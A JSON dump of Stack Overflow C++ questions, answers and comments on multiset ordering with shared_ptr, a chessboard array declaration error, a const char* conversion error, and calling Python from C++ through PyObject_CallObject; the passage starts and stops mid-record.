WS_EX_LEFT\n    LTEXT           \"... avisos de sospechosos bajo custodia.\", 0, 201, 163, 128, 9, SS_LEFT, WS_EX_LEFT\n    GROUPBOX        \"Configuraci\u00f3n del indicativo\", 0, 7, 4, 114, 28, 0, WS_EX_LEFT\n    GROUPBOX        \"Macro para desactivar el programa temporalmente\", 0, 127, 4, 206, 28, 0, WS_EX_LEFT\n}\n</code></pre>\n"}, {"tags": ["c++", "set", "shared-ptr"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 1, "creation_date": 1429724057, "post_id": 29804852, "comment_id": 47737671, "body": "1.) The set will be ordered by the pointers the shared_ptr(s) hold. 2.) It will iterate from low to high (but in terms of 1.)"}, {"owner": {"reputation": 869, "user_id": 1903880, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/3a7f0353e763f3e86ca839f199ebc6dd?s=128&d=identicon&r=PG", "display_name": "zhihuifan", "link": "https://stackoverflow.com/users/1903880/zhihuifan"}, "edited": false, "score": 0, "creation_date": 1429724612, "post_id": 29804852, "comment_id": 47738083, "body": "that&#39;s really make sense for my current situation.  what is the best way to order by the X.operator&lt; ?"}, {"owner": {"reputation": 869, "user_id": 1903880, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/3a7f0353e763f3e86ca839f199ebc6dd?s=128&d=identicon&r=PG", "display_name": "zhihuifan", "link": "https://stackoverflow.com/users/1903880/zhihuifan"}, "edited": false, "score": 1, "creation_date": 1429724806, "post_id": 29804852, "comment_id": 47738235, "body": "Actually I have read <a href=\"http://www.cplusplus.com/reference/memory/shared_ptr/operators/\" rel=\"nofollow noreferrer\">shared_ptr relation operator</a>and <a href=\"http://www.cplusplus.com/reference/memory/owner_less/\" rel=\"nofollow noreferrer\">owner_less</a>before I ask this question here.  but I still not sure about this.   to implement my idea, Can I just define m as std::multiset&lt;std::shared_ptr&lt;X&gt;, owner_less(std::shared_ptr&lt;X&gt;)&gt; ?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 0, "creation_date": 1429725062, "post_id": 29804852, "comment_id": 47738409, "body": "You can use: std::multiset with your own compare functor: <code>struct Less { bool operator () (std::shared_ptr&lt;X&gt; a, std::shared_ptr&lt;X&gt; b) { return ... } };</code>. But be warned: std::shared_ptr breaks const correctness logically!"}], "answers": [{"tags": [], "owner": {"reputation": 55324, "user_id": 977038, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/f3004677e3b024b4b1944dfd93fb9849?s=128&d=identicon&r=PG", "display_name": "Abhijit", "link": "https://stackoverflow.com/users/977038/abhijit"}, "is_accepted": true, "score": 8, "last_activity_date": 1429723995, "creation_date": 1429723995, "answer_id": 29804976, "question_id": 29804852, "link": "https://stackoverflow.com/questions/29804852/c-set-and-shared-ptr/29804976#29804976", "title": "c++ set and shared_ptr", "body": "<p>Your set is ordered based on your key_type which is <code>std::shared_ptr&lt;X&gt;</code>. As your <code>std::shared_ptr&lt;X&gt;</code> is <a href=\"http://en.cppreference.com/w/cpp/memory/shared_ptr/operator_cmp\" rel=\"noreferrer\">comparable</a>, the ordering of the <a href=\"http://en.cppreference.com/w/cpp/memory/shared_ptr\" rel=\"noreferrer\">std::shared_ptr</a> prevails.</p>\n\n<p>For the sake of reference, multiset is defined as</p>\n\n<pre><code>template&lt;\n    class Key,\n    class Compare = std::less&lt;Key&gt;,\n    class Allocator = std::allocator&lt;Key&gt;\n&gt; class multiset;\n</code></pre>\n\n<p>As can be seen, <code>typename Compare</code> is <code>std::less&lt;Key&gt;</code> and <a href=\"http://en.cppreference.com/w/cpp/utility/functional/less\" rel=\"noreferrer\">std::less</a> should overload the function overload which would possibly be implemented as</p>\n\n<pre><code>constexpr bool operator()(const T &amp;lhs, const T &amp;rhs) const \n{\n    return lhs &lt; rhs;\n}\n</code></pre>\n\n<p>both <code>lhs</code> and <code>rhs</code> is of type <code>T</code> which in this case is <code>Key</code> which is the type that we have instantiated multiset with which is <code>std::shared_ptr&lt;X&gt;</code>.</p>\n"}], "owner": {"reputation": 869, "user_id": 1903880, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/3a7f0353e763f3e86ca839f199ebc6dd?s=128&d=identicon&r=PG", "display_name": "zhihuifan", "link": "https://stackoverflow.com/users/1903880/zhihuifan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6528, "favorite_count": 1, "accepted_answer_id": 29804976, "answer_count": 1, "score": 5, "last_activity_date": 1429723995, "creation_date": 1429723638, "question_id": 29804852, "link": "https://stackoverflow.com/questions/29804852/c-set-and-shared-ptr", "title": "c++ set and shared_ptr", "body": "<p>I have class X like:</p>\n\n<pre><code>class X {\n    public:\n        bool operator&lt;(const SCN&amp; other) const;\n};\n</code></pre>\n\n<p>The I have the following code</p>\n\n<pre><code>std::multiset&lt;std::shared_ptr&lt;X&gt;&gt; m;\n</code></pre>\n\n<p>My questions are:</p>\n\n<ol>\n<li>how the data in m is ordered?   the address of X(shared_ptr) or the X.operator\n<li><p>for this m,  if I want to access its elements from smallest to bigest, can the following code grantee that? If not, How?</p>\n\n<pre><code>for (auto&amp; i : m) {\n    f(i);\n}\n</code></pre></li>\n</ol>\n"}, {"tags": ["c++"], "comments": [{"owner": {"reputation": 1890, "user_id": 642185, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/e4d3b496410072a74242cc02cad47fd1?s=128&d=identicon&r=PG", "display_name": "Liron", "link": "https://stackoverflow.com/users/642185/liron"}, "edited": false, "score": 0, "creation_date": 1429723489, "post_id": 29804781, "comment_id": 47737276, "body": "You might want to include what errors you&#39;re getting rather than making people try and guess."}, {"owner": {"reputation": 52656, "user_id": 225074, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/dea26ac1ef8259140d28aa8b5ba4f1b3?s=128&d=identicon&r=PG", "display_name": "Thomas Matthews", "link": "https://stackoverflow.com/users/225074/thomas-matthews"}, "edited": false, "score": 0, "creation_date": 1429724393, "post_id": 29804781, "comment_id": 47737926, "body": "This is not Java.  You need to review the syntax for declaring array variables."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 4820677, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11286b70ef8b26bf962699f2fc59960b?s=128&d=identicon&r=PG&f=1", "display_name": "Kioos", "link": "https://stackoverflow.com/users/4820677/kioos"}, "edited": false, "score": 0, "creation_date": 1429724706, "post_id": 29805041, "comment_id": 47738157, "body": "I did not think could be so complicated"}, {"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1429724715, "post_id": 29805041, "comment_id": 47738163, "body": "<a href=\"http://ideone.com/VPqLqV\" rel=\"nofollow noreferrer\">Your code</a> doesn&#39;t even work with constants and the right pointer type specified: <a href=\"http://ideone.com/alQWy1\" rel=\"nofollow noreferrer\">ideone.com/alQWy1</a> Provide a working live demo (ideone, coliru, etc.) please."}], "tags": [], "owner": {"reputation": 3540, "user_id": 4182275, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/sF9cb.png?s=128&g=1", "display_name": "NikolayK", "link": "https://stackoverflow.com/users/4182275/nikolayk"}, "is_accepted": true, "score": 2, "last_activity_date": 1429724190, "creation_date": 1429724190, "answer_id": 29805041, "question_id": 29804781, "link": "https://stackoverflow.com/questions/29804781/chessboard-class-give-me-error/29805041#29805041", "title": "Chessboard Class give me error", "body": "<pre><code>int[][]mat = new int[rows][columns];\n</code></pre>\n\n<p>should be </p>\n\n<pre><code>int mat[rows][columns];\n</code></pre>\n\n<p>if <code>rows</code> and <code>columns</code> are constants.\nOr </p>\n\n<pre><code>class Chess {\npublic:\n    Chess(int r, int c) {\n        rows = r;\n        columns = c;\n        mat = new int*[rows];\n        for(int i = 0; i &lt; rows; ++i)\n            mat[i] = new int[columns];\n    }\n\nprivate:\n    unsigned int rows = 0;\n    unsigned int columns = 0;\n    int** mat = nullptr;\n};\n</code></pre>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user4089193"}, "is_accepted": false, "score": 0, "last_activity_date": 1429725149, "last_edit_date": 1429725149, "creation_date": 1429724779, "answer_id": 29805242, "question_id": 29804781, "link": "https://stackoverflow.com/questions/29804781/chessboard-class-give-me-error/29805242#29805242", "title": "Chessboard Class give me error", "body": "<p>The problem lies here.</p>\n\n<blockquote>\n  <p>int[][]mat = new int[rows][columns];</p>\n</blockquote>\n\n<p>First make it public. If you need it to be private make sure you provide functions to access this private array.\nYou could simply declare it as </p>\n\n<pre><code>int mat[row][column];\n</code></pre>\n\n<p>If you want to understand what you are doing clearly, it looks something like this. You are declaring a 2 dimensional array. The above simple line is handled somewhat like this inside the compiler. The declaration would be:</p>\n\n<pre><code>int **mat = new *[columns];\nfor(int i = 0; i &lt; columns; ++i)\nary[columns] = new int[row];\n</code></pre>\n\n<p>This will create a 2D array of columns * row. i.e if there are 2 columns and 5 rows. you will get something like this:</p>\n\n<p>[+] -> [*****]\n[+] -> [*****]</p>\n\n<p>Where + is the column and holds the address to row arrays.</p>\n"}], "owner": {"reputation": 11, "user_id": 4820677, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11286b70ef8b26bf962699f2fc59960b?s=128&d=identicon&r=PG&f=1", "display_name": "Kioos", "link": "https://stackoverflow.com/users/4820677/kioos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "accepted_answer_id": 29805041, "answer_count": 2, "score": -3, "last_activity_date": 1429725149, "creation_date": 1429723416, "last_edit_date": 1429724198, "question_id": 29804781, "link": "https://stackoverflow.com/questions/29804781/chessboard-class-give-me-error", "title": "Chessboard Class give me error", "body": "<p>This is a class for a Chessboard .\nHow can i resolve the error that the compiler give ? Thanks</p>\n\n<p><strong>The error is \" expected unqualified-id before '[' token|\"</strong></p>\n\n<pre><code>#ifndef SCACCHIERA_H_INCLUDED\n#define SCACCHIERA_H_INCLUDED\n\nclass Chess {\npublic:\n\n\nprivate:\n    unsigned int rows = 0;\n    unsigned int columns = 0;\n    int[][]mat = new int[rows][columns];\n};\n\n\n#endif // SCACCHIERA_H_INCLUDED\n</code></pre>\n\n<p>With the help of a user i changed the code to </p>\n\n<pre><code>class Chess {\n\npublic:\n    Chess(unsigned int a):mat(mat[a][a]){};\n\nprivate:\n    int mat[0][0];\n};\n</code></pre>\n\n<p>But now the compiler gives me the error\n<strong><em>incompatible types in assignment of 'int' to 'int [0][0]'|</em></strong></p>\n"}, {"tags": ["c++", "string", "strcmp"], "comments": [{"owner": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 3, "creation_date": 1429723450, "post_id": 29804730, "comment_id": 47737251, "body": "I think you are using a C++ compiler not C"}, {"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 0, "creation_date": 1429723676, "post_id": 29804730, "comment_id": 47737389, "body": "You seem to be using Borland/Turbo C, which is not very standard complaint nor does it support modern C.  <code>gets()</code> is unsafe and has been deprecated. Use <code>fgets()</code> instead. Btw, your code seems fine."}, {"owner": {"reputation": 1334, "user_id": 2156785, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oQr9B.jpg?s=128&g=1", "display_name": "ANjaNA", "link": "https://stackoverflow.com/users/2156785/anjana"}, "edited": false, "score": 1, "creation_date": 1429724173, "post_id": 29804730, "comment_id": 47737761, "body": "change <code>char *results_word;</code> to <code>const char *results_word;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 0, "creation_date": 1429723602, "post_id": 29804806, "comment_id": 47737346, "body": "Are you assuming a C++ compiler?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 0, "creation_date": 1429723655, "post_id": 29804806, "comment_id": 47737373, "body": "@ShafikYaghmour: You are correct in C this would be no issue."}, {"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "reply_to_user": {"reputation": 127, "user_id": 4726177, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/79c3978d8d2b0da58a6a6e39dbd2bde2?s=128&d=identicon&r=PG&f=1", "display_name": "Shinz6", "link": "https://stackoverflow.com/users/4726177/shinz6"}, "edited": false, "score": 0, "creation_date": 1429723769, "post_id": 29804806, "comment_id": 47737455, "body": "@Shinz6 Then tag C++. Answer differs based on what language you use."}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1429724239, "post_id": 29804806, "comment_id": 47737813, "body": "Hasn&#39;t this been fixed in C11? String literals are now <code>const char*</code> as they always really were. Allowing <code>char*</code> for literals was a compatibility hack."}, {"owner": {"user_type": "does_not_exist", "display_name": "user743382"}, "reply_to_user": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1429724455, "post_id": 29804806, "comment_id": 47737975, "body": "@ZanLynx You&#39;re thinking of C++11, which did remove that conversion. In C, as far as I know even in C11, string literals really have type <code>char []</code>."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1429724465, "post_id": 29804806, "comment_id": 47737980, "body": "gcc using <code>-std=c11</code> does not complain about <code>char * p = &quot;alk&quot;;</code>. @ZanLynx"}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1429725307, "post_id": 29804806, "comment_id": 47738580, "body": "I guess I was wrong about C11. Disappointing. Silly too, because the result of assigning to a string literal is an access fault and crash."}], "tags": [], "owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "is_accepted": true, "score": 4, "last_activity_date": 1429723675, "last_edit_date": 1429723675, "creation_date": 1429723513, "answer_id": 29804806, "question_id": 29804730, "link": "https://stackoverflow.com/questions/29804730/invalid-conversion-from-const-char-to-char/29804806#29804806", "title": "invalid conversion from `const char*&#39; to `char*&#39;", "body": "<p>The C++ error message you are getting says it all:</p>\n\n<blockquote>\n  <p>invalid conversion from `const char*' to `char*'</p>\n</blockquote>\n\n<p>You are trying to assign some constant <code>\"&lt;literal&gt;\"</code> to the non constant <code>results_word</code>.</p>\n\n<p>Change </p>\n\n<pre><code>char *results_word;\n</code></pre>\n\n<p>to be </p>\n\n<pre><code>const char *results_word;\n</code></pre>\n\n<p>and it will work.</p>\n"}], "owner": {"reputation": 127, "user_id": 4726177, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/79c3978d8d2b0da58a6a6e39dbd2bde2?s=128&d=identicon&r=PG&f=1", "display_name": "Shinz6", "link": "https://stackoverflow.com/users/4726177/shinz6"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 12673, "favorite_count": 0, "accepted_answer_id": 29804806, "answer_count": 1, "score": 0, "last_activity_date": 1429724401, "creation_date": 1429723282, "last_edit_date": 1429723876, "question_id": 29804730, "link": "https://stackoverflow.com/questions/29804730/invalid-conversion-from-const-char-to-char", "title": "invalid conversion from `const char*&#39; to `char*&#39;", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;conio.h&gt;\n#define SIZE 20\n\nint main( void )\n{\n    int n; //number of characters to be compared\n    char s1[ SIZE ], s2[ SIZE ];\n    char *results_word;\n\n    printf( \"Enter two strings: \" );\n    gets( s1 );\n    gets( s2 );\n    printf( \"\\nEnter the number of characters to be compared: \" );\n    scanf( \"%d\", &amp;n );\n</code></pre>\n\n<p>The problem starts here</p>\n\n<pre><code>    results_word = \n                 strncmp( s1, s2, n ) &gt; 0 ? \" greater than \" : \n                 strncmp( s1, s2, n ) == 0 ? \" equal to \" : \" smaller than \" ;\n\n    printf( \"\\n%sis%s%s\", s1, results_word, s2 );\n\n    getche();\n    return 0;\n}//end function main\n</code></pre>\n\n<p>So why doesn't result_word get the corresponding string ?</p>\n"}, {"tags": ["python", "c++", "numpy", "pyobject"], "comments": [{"owner": {"reputation": 15468, "user_id": 321772, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/c03247f45c9f291391b894375c2709ca?s=128&d=identicon&r=PG", "display_name": "Adam", "link": "https://stackoverflow.com/users/321772/adam"}, "edited": false, "score": 1, "creation_date": 1429723437, "post_id": 29804623, "comment_id": 47737236, "body": "Do either <code>PyObject_GetAttrString(pyName, _T(&quot;find_center&quot;))</code> or <code>PyTuple_SetItem(arg, 1, datum1)</code> return 0?"}, {"owner": {"reputation": 87, "user_id": 4784109, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ZJdKAgyDjtI/AAAAAAAAAAI/AAAAAAAAD8I/SzdeGeen1Ns/photo.jpg?sz=128", "display_name": "runcyclexcski", "link": "https://stackoverflow.com/users/4784109/runcyclexcski"}, "reply_to_user": {"reputation": 15468, "user_id": 321772, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/c03247f45c9f291391b894375c2709ca?s=128&d=identicon&r=PG", "display_name": "Adam", "link": "https://stackoverflow.com/users/321772/adam"}, "edited": false, "score": 0, "creation_date": 1429724529, "post_id": 29804623, "comment_id": 47738027, "body": "Adam -- they all return 0 (i.e. are successful), the code runs all the way to the final NULL== result."}, {"owner": {"reputation": 87, "user_id": 4784109, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ZJdKAgyDjtI/AAAAAAAAAAI/AAAAAAAAD8I/SzdeGeen1Ns/photo.jpg?sz=128", "display_name": "runcyclexcski", "link": "https://stackoverflow.com/users/4784109/runcyclexcski"}, "reply_to_user": {"reputation": 15468, "user_id": 321772, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/c03247f45c9f291391b894375c2709ca?s=128&d=identicon&r=PG", "display_name": "Adam", "link": "https://stackoverflow.com/users/321772/adam"}, "edited": false, "score": 0, "creation_date": 1429725045, "post_id": 29804623, "comment_id": 47738401, "body": "don&#39;t know if it&#39;s a clue, but if I make the py function return any non-zero number (say 15), C++ replaces it with a zero: \\nPyObject * result = PyObject_CallObject(pyFunc, arg);int final_result =  PyLong_AsLong(result); (final result is always 0, or 0.0 if I use doubles)"}, {"owner": {"reputation": 87, "user_id": 4784109, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ZJdKAgyDjtI/AAAAAAAAAAI/AAAAAAAAD8I/SzdeGeen1Ns/photo.jpg?sz=128", "display_name": "runcyclexcski", "link": "https://stackoverflow.com/users/4784109/runcyclexcski"}, "reply_to_user": {"reputation": 15468, "user_id": 321772, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/c03247f45c9f291391b894375c2709ca?s=128&d=identicon&r=PG", "display_name": "Adam", "link": "https://stackoverflow.com/users/321772/adam"}, "edited": false, "score": 1, "creation_date": 1429725900, "post_id": 29804623, "comment_id": 47738964, "body": "I apologize for responding to myself. I found that if I simplify making of the PyTuple argument by calling PyObject * arg = Py_BuildValue(&quot;(d)&quot;, 5.0);, the symptoms remain -- the call succeeds when the tuple length is 1 (one d in the format string), but fails when tuple length is &gt;1 (two ore more ds in the format string). Responses get zeroed out though, not sure if it&#39;s a part of the same problem."}, {"owner": {"reputation": 15468, "user_id": 321772, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/c03247f45c9f291391b894375c2709ca?s=128&d=identicon&r=PG", "display_name": "Adam", "link": "https://stackoverflow.com/users/321772/adam"}, "edited": false, "score": 0, "creation_date": 1429733203, "post_id": 29804623, "comment_id": 47743617, "body": "Does <code>PyCallable_Check(pyFunc)</code> return 1?"}, {"owner": {"reputation": 87, "user_id": 4784109, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ZJdKAgyDjtI/AAAAAAAAAAI/AAAAAAAAD8I/SzdeGeen1Ns/photo.jpg?sz=128", "display_name": "runcyclexcski", "link": "https://stackoverflow.com/users/4784109/runcyclexcski"}, "reply_to_user": {"reputation": 15468, "user_id": 321772, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/c03247f45c9f291391b894375c2709ca?s=128&d=identicon&r=PG", "display_name": "Adam", "link": "https://stackoverflow.com/users/321772/adam"}, "edited": false, "score": 1, "creation_date": 1429734818, "post_id": 29804623, "comment_id": 47744578, "body": "Adam -- yes, the function is callable, and all sanity checks are OK up to the last call. I have <i>partially</i> worked around the issue by setting the argument of PyObject_CallObject to a tuple of size 1, containing one list of doubles of size N. I have never managed to call PyObject_CallObject using a tuple of size&gt;1 as argument. I am now getting a response back, packed in a tuple of three doubles (which so far only gives me 0.0 upon parsing -- may be it&#39;s a unicode issue)"}], "answers": [{"comments": [{"owner": {"reputation": 87, "user_id": 4784109, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ZJdKAgyDjtI/AAAAAAAAAAI/AAAAAAAAD8I/SzdeGeen1Ns/photo.jpg?sz=128", "display_name": "runcyclexcski", "link": "https://stackoverflow.com/users/4784109/runcyclexcski"}, "edited": false, "score": 0, "creation_date": 1429738127, "post_id": 29808606, "comment_id": 47746488, "body": "Adam, yes, I got it experimentally, and I understand it now. May be the documentation could have stated it more explicitly that the length of the tuple should be 1. It was not obvious from examples I have found, which used PyTuple_SetItem, because the latter used item indices &gt;0. At any rate, using <i>PyObject * arg = Py_BuildValue(&quot;(O)&quot;, list)</i> to make my input tuple, where <i>list</i> was build by PyList_SetItem, worked. And <i>list</i> could also have been the N-element tuple, as you said."}, {"owner": {"reputation": 87, "user_id": 4784109, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ZJdKAgyDjtI/AAAAAAAAAAI/AAAAAAAAD8I/SzdeGeen1Ns/photo.jpg?sz=128", "display_name": "runcyclexcski", "link": "https://stackoverflow.com/users/4784109/runcyclexcski"}, "edited": false, "score": 0, "creation_date": 1429738265, "post_id": 29808606, "comment_id": 47746557, "body": "One more thing... the return format from python was proper, but I was getting zeros, because my VS2013 defaulted to Unicode and I was using a non-Unicode method to report values."}], "tags": [], "owner": {"reputation": 15468, "user_id": 321772, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/c03247f45c9f291391b894375c2709ca?s=128&d=identicon&r=PG", "display_name": "Adam", "link": "https://stackoverflow.com/users/321772/adam"}, "is_accepted": true, "score": 2, "last_activity_date": 1429736046, "creation_date": 1429736046, "answer_id": 29808606, "question_id": 29804623, "link": "https://stackoverflow.com/questions/29804623/c-to-numpy-and-back-to-c-tuple-pyobject/29808606#29808606", "title": "C++ to numpy and back to C++, tuple PyObject", "body": "<p>You're only able to add a single value to your tuple because </p>\n\n<blockquote>\n  <p>PyObject* PyObject_CallObject(PyObject *callable_object, PyObject\n  *args)\n      Call a callable Python object callable_object, <strong>with arguments given by the tuple args</strong></p>\n</blockquote>\n\n<p>(emphasis mine). In other words, the second argument to <code>PyObject_CallObject</code> is a tuple of the arguments. Your function takes a single argument, so the length of that tuple has to be 1.</p>\n\n<p>Since you're trying to pass a tuple as that one argument, you need your two-element tuple to be the first element of a single-element tuple that you pass as the second argument to <code>PyObject_CallObject</code>.</p>\n\n<p>Another option is to use <code>PyObject_CallFunction</code> instead, and let it build the argument tuple.</p>\n"}], "owner": {"reputation": 87, "user_id": 4784109, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ZJdKAgyDjtI/AAAAAAAAAAI/AAAAAAAAD8I/SzdeGeen1Ns/photo.jpg?sz=128", "display_name": "runcyclexcski", "link": "https://stackoverflow.com/users/4784109/runcyclexcski"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1312, "favorite_count": 0, "accepted_answer_id": 29808606, "answer_count": 1, "score": 2, "last_activity_date": 1429736046, "creation_date": 1429723011, "question_id": 29804623, "link": "https://stackoverflow.com/questions/29804623/c-to-numpy-and-back-to-c-tuple-pyobject", "title": "C++ to numpy and back to C++, tuple PyObject", "body": "<p>I am implementing a Visual C++ code (MS VStudio 2013) that acquires an image from a camera, processes the image, sends pre-processed data (an array 2 or more doubles) to python through a PyObject, and gets numpy-processed results back from python (a tuple of 3 doubles in py, which is becomes an array of 3 doubles in C++). I tested the py function as a standalone script. However, I keep getting a null as a return from PyObject_CallObject(). python and the VC++ project reside in the same directory.</p>\n\n<p>I have set up a log file record in the py function to document the calls from C, so I know that in some cases the C++ calls do not reach the py function, and in other cases the py function does get called, but, perhaps, the returned values cannot be processed. Specifically, I found that I can call the py function (positive log record) when the tuple contains one object, but I cannot call it (no log file records) when the tuple contains two or more objects. In addition, if the py function needs no arguments, and does not need to return anything, all calls are successful.</p>\n\n<p>I have googled and read everything having to do with using Tuples to communicate between C++ and py, but still did not make it work. I have also read the documentation and the examples, still no luck.</p>\n\n<p>I have stripped the code to a bare minimum below and reproduced the problem. Below is an example when I pass two zeros as input, and expect to get three zeros back. I would be very grateful for any leads on this...</p>\n\n<pre><code>//C++ part\n    Py_Initialize();    \n    pyName = PyImport_ImportModuleNoBlock(_T(\"find_center_def\"));\n    if (pyName == NULL) {       \n        return false;\n    }\n    pyFunc = PyObject_GetAttrString(pyName, _T(\"find_center\"));\n    if (pyFunc == NULL) {\n        return false;\n    }\n    Py_DECREF(pyName);\n    if (PyCallable_Check(pyFunc) == 0) {\n        return false;\n    }\n    PyObject * arg = PyTuple_New(2);\n    PyObject * datum0 = PyFloat_FromDouble(0.0);\n    PyObject * datum1 = PyFloat_FromDouble(0.0);\n    if (PyTuple_SetItem(arg, 0, datum0) != 0) {\n        return false;\n        }\n    if (PyTuple_SetItem(arg, 1, datum1) != 0) {         \n        return false;\n        }\n    PyObject * result = PyObject_CallObject(pyFunc, arg);\n    if (result == NULL) {\n        return false;\n    }\n    OutputDebugString(_T(\"\\nSuccess calling find_center function!\"));\n\n#python part, inside of a script called find_center_def.py\ndef find_center(args):\n    import numpy        \n    fo=open('foo.txt' ,'w')\n    fo.write('find_center was called from C++!')\n    fo.close()\n    return (0,0,0)\n\n#python output:\nPython 3.4.3 (v3.4.3:9b73f1c3e601, Feb 24 2015, 22:44:40) [MSC v.1600 64 bit (AMD64)] on win32\n&gt;&gt;&gt; import importlib\n&gt;&gt;&gt; test = importlib.import_module(\"find_center_def\")\n&gt;&gt;&gt; test.find_center((0,0))\n(0, 0, 0)\n&gt;&gt;&gt;\n</code></pre>\n"}, {"tags": ["c++", "pointers", "polymorphism", "operator-overloading"], "comments": [{"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": 